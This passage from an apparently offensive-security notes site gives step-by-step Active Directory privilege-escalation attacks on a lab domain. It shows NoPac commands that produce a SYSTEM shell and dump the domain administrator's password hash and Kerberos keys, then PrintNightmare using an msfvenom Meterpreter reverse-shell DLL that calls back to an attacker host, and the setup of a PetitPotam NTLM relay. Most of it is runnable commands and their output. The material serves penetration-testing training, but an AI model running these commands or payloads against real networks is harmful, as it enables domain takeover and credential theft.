<span class=md-ellipsis> Hydra </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_4 type=checkbox id=__nav_4_3_9_4> <label class=md-nav__link for=__nav_4_3_9_4> <span class=md-ellipsis> SQLMap </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SQLMap data-md-level=4> <label class=md-nav__title for=__nav_4_3_9_4> <span class="md-nav__icon md-icon"></span> SQLMap </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/sqlmap/build_attacks/ class=md-nav__link> <span class=md-ellipsis> Building Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/db_enumeration/ class=md-nav__link> <span class=md-ellipsis> DB Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/advanced_db_enumeration/ class=md-nav__link> <span class=md-ellipsis> Advanced DB Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/bypassing_web_protections/ class=md-nav__link> <span class=md-ellipsis> Bypassing Web App Protections </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/os_exploitation/ class=md-nav__link> <span class=md-ellipsis> OS Exploitation </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../web/xss/cross_site_scripting/ class=md-nav__link> <span class=md-ellipsis> XSS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/lfi/local_file_inclusion/ class=md-nav__link> <span class=md-ellipsis> Local File Inclusion </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_10 type=checkbox id=__nav_4_3_10> <label class=md-nav__link for=__nav_4_3_10> <span class=md-ellipsis> Documenting & Reporting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Documenting & Reporting" data-md-level=3> <label class=md-nav__title for=__nav_4_3_10> <span class="md-nav__icon md-icon"></span> Documenting & Reporting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../documentation_and_reporting/preparation/ class=md-nav__link> <span class=md-ellipsis> Preparation </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4 type=checkbox id=__nav_4_4> <label class=md-nav__link for=__nav_4_4> <span class=md-ellipsis> Blue Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_4_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../file_analysis/useful_links/ class=md-nav__link> <span class=md-ellipsis> File Analysis </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2 type=checkbox id=__nav_4_4_2> <label class=md-nav__link for=__nav_4_4_2> <span class=md-ellipsis> Network Traffic Analysis </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_4_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/layers/ class=md-nav__link> <span class=md-ellipsis> Layers </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/analysis/ class=md-nav__link> <span class=md-ellipsis> Analysis </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2_3 type=checkbox id=__nav_4_4_2_3> <label class=md-nav__link for=__nav_4_4_2_3> <span class=md-ellipsis> Tcpdump </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_4_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> <span class=md-ellipsis> Fundamentals </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> <span class=md-ellipsis> Packet Filtering </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2_4 type=checkbox id=__nav_4_4_2_4> <label class=md-nav__link for=__nav_4_4_2_4> <span class=md-ellipsis> Wireshark </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_4_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> <span class=md-ellipsis> Analysis </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> <span class=md-ellipsis> Advanced Usage </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>Vulnerabilities</h1> <h2>NoPac (SamAccountName Spoofing)</h2> <p>This encompasses two CVEs <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278 target=_blank rel="noopener nofollow">2021-42278</a> and <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287 target=_blank rel="noopener nofollow">2021-42287</a>, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.</p> <p>We can use this <a href=https://github.com/Ridter/noPac target=_blank rel="noopener nofollow">tool</a> to perform this attack.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>secops@kali[/kali]$ git clone https://github.com/Ridter/noPac.git
</code></pre></div> <p>We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is vulnerable. </p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>secops@kali[/kali]$ sudo python3 scanner.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>               
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>                       
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>                  
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>                         
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a>                   
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a>[*] Current ms-DS-MachineAccountQuota = 10
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a>[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a>[*] Got TGT from ACADEMY-EA-DC01.legalcorp.local. Ticket size 663
</code></pre></div> <p>There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. This could be "noisy" or may be blocked by AV or EDR.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>secops@kali[/kali]$ sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>               
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>                       
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>                  
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>                         
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a>                   
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a>[*] Current ms-DS-MachineAccountQuota = 10
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a>[*] Selected Target ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a>[*] will try to impersonat administrator
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a>[*] Adding Computer Account &quot;WIN-LWJFQMAXRVN$&quot;
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a>[*] MachineAccount &quot;WIN-LWJFQMAXRVN$&quot; password = &amp;A#x8X^5iLva
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a>[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A#x8X^5iLva.
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a>[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=LEGALCORP,DC=LOCAL
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a>[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a>[*] Saving ticket in ACADEMY-EA-DC01.ccache
<a id=__codelineno-2-18 name=__codelineno-2-18 href=#__codelineno-2-18></a>[*] Resting the machine account to WIN-LWJFQMAXRVN$
<a id=__codelineno-2-19 name=__codelineno-2-19 href=#__codelineno-2-19></a>[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
<a id=__codelineno-2-20 name=__codelineno-2-20 href=#__codelineno-2-20></a>[*] Using TGT from cache
<a id=__codelineno-2-21 name=__codelineno-2-21 href=#__codelineno-2-21></a>[*] Impersonating administrator
<a id=__codelineno-2-22 name=__codelineno-2-22 href=#__codelineno-2-22></a>[*]     Requesting S4U2self
<a id=__codelineno-2-23 name=__codelineno-2-23 href=#__codelineno-2-23></a>[*] Saving ticket in administrator.ccache
<a id=__codelineno-2-24 name=__codelineno-2-24 href=#__codelineno-2-24></a>[*] Remove ccache of ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-2-25 name=__codelineno-2-25 href=#__codelineno-2-25></a>[*] Rename ccache with target ...
<a id=__codelineno-2-26 name=__codelineno-2-26 href=#__codelineno-2-26></a>[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
<a id=__codelineno-2-27 name=__codelineno-2-27 href=#__codelineno-2-27></a>[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
<a id=__codelineno-2-28 name=__codelineno-2-28 href=#__codelineno-2-28></a>[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
<a id=__codelineno-2-29 name=__codelineno-2-29 href=#__codelineno-2-29></a>[*] Exploiting..
<a id=__codelineno-2-30 name=__codelineno-2-30 href=#__codelineno-2-30></a>[!] Launching semi-interactive shell - Careful what you execute
<a id=__codelineno-2-31 name=__codelineno-2-31 href=#__codelineno-2-31></a>C:\Windows\system32&gt;
</code></pre></div> <p>With smbexec shells we will need to use exact paths instead of navigating the directory structure using <code>cd</code>.</p> <p>Confirming location of saved tickets <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>secops@kali[/kali]$ ls
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>administrator_DC01.legalcorp.local.ccache  noPac.py   requirements.txt  utils
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>README.md  scanner.py
</code></pre></div></p> <p>We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the <code>-dump</code> flag to perform a DCSync using secretsdump.py.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>secops@kali[/kali]$ sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user LEGALCORP/administrator
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>               
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>                       
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>                  
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>                         
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>                   
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a>[*] Current ms-DS-MachineAccountQuota = 10
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a>[*] Selected Target ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>[*] will try to impersonat administrator
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a>[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a>[*] Exploiting..
<a id=__codelineno-4-15 name=__codelineno-4-15 href=#__codelineno-4-15></a>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
<a id=__codelineno-4-16 name=__codelineno-4-16 href=#__codelineno-4-16></a>[*] Using the DRSUAPI method to get NTDS.DIT secrets
<a id=__codelineno-4-17 name=__codelineno-4-17 href=#__codelineno-4-17></a>legalcorp.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
<a id=__codelineno-4-18 name=__codelineno-4-18 href=#__codelineno-4-18></a>[*] Kerberos keys grabbed
<a id=__codelineno-4-19 name=__codelineno-4-19 href=#__codelineno-4-19></a>legalcorp.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
<a id=__codelineno-4-20 name=__codelineno-4-20 href=#__codelineno-4-20></a>legalcorp.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
<a id=__codelineno-4-21 name=__codelineno-4-21 href=#__codelineno-4-21></a>legalcorp.local\administrator:des-cbc-md5:70add6e02f70321f
<a id=__codelineno-4-22 name=__codelineno-4-22 href=#__codelineno-4-22></a>[*] Cleaning up...
</code></pre></div> <hr> <h2>Windows Defender & SMBEXEC.py Considerations</h2> <p>If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called <code>BTOBTO</code>. Another service called <code>BTOBO</code> is created, and any command we type is sent to the target over SMB inside a .bat file called <code>execute.bat</code>. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system.</p> <hr> <h2>PrintNightmare</h2> <p>In this case, we will be using <a href="https://twitter.com/cube0x0?lang=en" target=_blank rel="noopener nofollow">cube0x0's</a> exploit.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>secops@kali[/kali]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
</code></pre></div> <p>For this exploit to work successfully, we will need to use cube0x0's version of Impacket. <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a>pip3 uninstall impacket
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>git clone https://github.com/cube0x0/impacket
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>cd impacket
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>python3 ./setup.py install
</code></pre></div></p> <p>We can use <code>rpcdump.py</code> to see if <code>Print System Asynchronous Protocol</code> and <code>Print System Remote Protocol</code> are exposed on the target.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>secops@kali[/kali]$ rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>Protocol: [MS-RPRN]: Print System Remote Protocol 
</code></pre></div> <p>After confirming this, we can proceed.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a>[-] No arch selected, selecting arch: x64 from the payload
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a>No encoder specified, outputting raw payload
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a>Payload size: 510 bytes
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a>Final size of dll file: 8704 bytes
</code></pre></div> <p>Host this payload in an SMB share we create on our attack host using <code>smbserver.py</code>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a>secops@kali[/kali]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a>[*] Config file parsed
<a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a>[*] Config file parsed
<a id=__codelineno-9-9 name=__codelineno-9-9 href=#__codelineno-9-9></a>[*] Config file parsed
<a id=__codelineno-9-10 name=__codelineno-9-10 href=#__codelineno-9-10></a>[*] Config file parsed
</code></pre></div> <p>Once the share is created and hosting our payload, we can use MSF to configure &amp; start a multi handler responsible for catching the reverse shell.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a>[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>[*] Using configured payload generic/shell_reverse_tcp
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
<a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp
<a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LHOST 10.129.202.111
<a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a>LHOST =&gt; 10.3.88.114
<a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LPORT 8080
<a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a>LPORT =&gt; 8080
<a id=__codelineno-10-9 name=__codelineno-10-9 href=#__codelineno-10-9></a>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run
<a id=__codelineno-10-10 name=__codelineno-10-10 href=#__codelineno-10-10></a>
<a id=__codelineno-10-11 name=__codelineno-10-11 href=#__codelineno-10-11></a>[*] Started reverse TCP handler on 10.129.202.111:8080 
</code></pre></div> <p>With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a>secops@kali[/kali]$ sudo python3 CVE-2021-1675.py legalcorp.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 &#39;\\10.129.202.111\CompData\backupscript.dll&#39;
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a>[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a>[+] Bind OK
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a>[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>[*] Executing \??\UNC\10.129.202.111\CompData\backupscript.dll
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a>[*] Try 1...
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a>[*] Stage0: 0
<a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a>[*] Try 2...
<a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a>[*] Stage0: 0
<a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a>[*] Try 3...
<a id=__codelineno-11-12 name=__codelineno-11-12 href=#__codelineno-11-12></a>
<a id=__codelineno-11-13 name=__codelineno-11-13 href=#__codelineno-11-13></a>&lt;SNIP&gt;
</code></pre></div> <p>If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a>[*] Sending stage (200262 bytes) to 172.16.5.5
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a>[*] Meterpreter session 1 opened (10.129.202.111:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a>
<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a>(Meterpreter 1)(C:\Windows\system32) &gt; shell
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a>Process 5912 created.
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a>Channel 1 created.
<a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a>Microsoft Windows [Version 10.0.17763.737]
<a id=__codelineno-12-8 name=__codelineno-12-8 href=#__codelineno-12-8></a>(c) 2018 Microsoft Corporation. All rights reserved.
<a id=__codelineno-12-9 name=__codelineno-12-9 href=#__codelineno-12-9></a>
<a id=__codelineno-12-10 name=__codelineno-12-10 href=#__codelineno-12-10></a>C:\Windows\system32&gt;whoami
<a id=__codelineno-12-11 name=__codelineno-12-11 href=#__codelineno-12-11></a>whoami
<a id=__codelineno-12-12 name=__codelineno-12-12 href=#__codelineno-12-12></a>nt authority\system
</code></pre></div> <p>We have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.</p> <hr> <h2>PetitPotam (MS-EFSRPC)</h2> <p>PetitPotam (<a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942 target=_blank rel="noopener nofollow">CVE-2021-36942</a>) is an LSA spoofing vulnerability that was patched in August of 2021.</p> <p><a href=https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/ target=_blank rel="noopener nofollow">This</a> blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.</p> <p>First off, we need to start <code>ntlmrelayx.py</code> in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as <a href=https://github.com/zer1t0/certi target=_blank rel="noopener nofollow">certi</a> to attempt to locate it.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a>secops@kali[/kali]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a>
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a>
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a>Copyright 2021 SecureAuth Corporation
<a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a>
<a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a>[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
<a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a>[*] Protocol Client DCSYNC loaded..
<a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a>[*] Protocol Client HTTP loaded..
<a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a>[*] Protocol Client HTTPS loaded..
<a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a>[*] Protocol Client IMAPS loaded..
<a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a>[*] Protocol Client IMAP loaded..
<a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a>[*] Protocol Client LDAP loaded..
<a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a>[*] Protocol Client LDAPS loaded..
<a id=__codelineno-13-15 name=__codelineno-13-15 href=#__codelineno-13-15></a>[*] Protocol Client MSSQL loaded..
<a id=__codelineno-13-16 name=__codelineno-13-16 href=#__codelineno-13-16></a>[*] Protocol Client RPC loaded..
<a id=__codelineno-13-17 name=__codelineno-13-17 href=#__codelineno-13-17></a>[*] Protocol Client SMB loaded..
<a id=__codelineno-13-18 name=__codelineno-13-18 href=#__codelineno-13-18></a>[*] Protocol Client SMTP loaded..
<a id=__codelineno-13-19 name=__codelineno-13-19 href=#__codelineno-13-19></a>[+] Protocol Attack DCSYNC loaded..
<a id=__codelineno-13-20 name=__codelineno-13-20 href=#__codelineno-13-20></a>[+] Protocol Attack HTTP loaded..
<a id=__codelineno-13-21 name=__codelineno-13-21 href=#__codelineno-13-21></a>[+] Protocol Attack HTTPS loaded..
<a id=__codelineno-13-22 name=__codelineno-13-22 href=#__codelineno-13-22></a>[+] Protocol Attack IMAP loaded..
<a id=__codelineno-13-23 name=__codelineno-13-23 href=#__codelineno-13-23></a>[+] Protocol Attack IMAPS loaded..
<a id=__codelineno-13-24 name=__codelineno-13-24 href=#__codelineno-13-24></a>[+] Protocol Attack LDAP loaded..
<a id=__codelineno-13-25 name=__codelineno-13-25 href=#__codelineno-13-25></a>[+] Protocol Attack LDAPS loaded..
<a id=__codelineno-13-26 name=__codelineno-13-26 href=#__codelineno-13-26></a>[+] Protocol Attack MSSQL loaded..
<a id=__codelineno-13-27 name=__codelineno-13-27 href=#__codelineno-13-27></a>[+] Protocol Attack RPC loaded..
<a id=__codelineno-13-28 name=__codelineno-13-28 href=#__codelineno-13-28></a>[+] Protocol Attack SMB loaded..
<a id=__codelineno-13-29 name=__codelineno-13-29 href=#__codelineno-13-29></a>[*] Running in relay mode to single host
<a id=__codelineno-13-30 name=__codelineno-13-30 href=#__codelineno-13-30></a>[*] Setting up SMB Server
<a id=__codelineno-13-31 name=__codelineno-13-31 href=#__codelineno-13-31></a>[*] Setting up HTTP Server
